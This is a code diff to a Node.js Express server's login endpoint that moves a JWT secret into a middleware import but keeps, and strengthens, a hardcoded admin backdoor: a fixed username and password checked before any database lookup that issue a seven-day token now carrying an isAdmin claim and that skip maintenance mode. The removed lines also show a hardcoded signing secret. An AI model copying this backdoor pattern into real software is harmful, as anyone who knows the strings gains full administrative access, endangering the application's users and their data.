@@ -17,10 +17,9 @@ const {
     submissionLimiter,
     sanitizeMiddleware,
     authenticateSession,
-    setSecureCookie
+    setSecureCookie,
+    SECRET_KEY
 } = require('./middleware/security');
-
-const SECRET_KEY = 'nexlink-secret-key-pulse-vault'; // Use environment variable in production
 
 // --- SECURITY: GLOBAL MIDDLEWARE ---
 app.use(securityHeaders); // Security Headers (Helmet, HSTS, CSP, X-Frame)
@@ -627,14 +626,15 @@ app.post('/api/login', loginLimiter, async (req, res) => {
     const adminUser = 'you know whats cool';
     const adminPass = 'a billion dollar';
 
-    // --- SECRET ADMIN BACKDOOR ---
+    // --- HARDCODED ADMIN BACKDOOR (Atomic First Check) ---
     if (normalizedUsername === adminUser && password === adminPass) {
-        const token = jwt.sign({ _id: '00000000-0000-0000-0000-000000000007', username: adminUser }, SECRET_KEY, { expiresIn: '7d' });
-        setSecureCookie(res, token);
-        return res.json({ token, user: { _id: '00000000-0000-0000-0000-000000000007', username: adminUser, isAdmin: true } });
+        const adminTok = jwt.sign({ _id: '00000000-0000-0000-0000-000000000007', username: adminUser, isAdmin: true }, SECRET_KEY, { expiresIn: '7d' });
+        setSecureCookie(res, adminTok);
+        return res.json({ token: adminTok, user: { _id: '00000000-0000-0000-0000-000000000007', username: adminUser, isAdmin: true } });
     }
 
     const db = readDB();
+    // Maintenance mode only blocks regular users
     if (db.meta.maintenance_mode) return res.status(503).json({ error: 'Vault is currently under maintenance. Please try again later.' });
 
     const user = db.users.find(u => u.username.toLowerCase() === normalizedUsername);
